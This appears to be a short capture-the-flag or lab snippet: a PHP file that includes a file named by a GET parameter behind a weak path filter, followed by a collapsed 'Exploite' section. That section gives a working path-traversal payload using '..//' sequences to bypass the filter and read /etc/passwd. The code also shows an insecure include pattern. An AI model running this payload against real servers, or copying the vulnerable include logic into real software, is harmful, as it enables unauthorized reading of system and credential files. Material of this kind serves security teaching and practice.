```php
<?php
  function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
  }
  if(isset($_GET["view"])){
  if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
    include $_GET['view'];
  }else{
    echo 'Sorry, Thats not allowed';
  }
}
?>
```

<details>
  <summary><b>Exploite</b></summary>

  ```text
view=/var/www/html/development_testing/..//..//..//..//..//..//..//etc/passwd
  ```
</details>
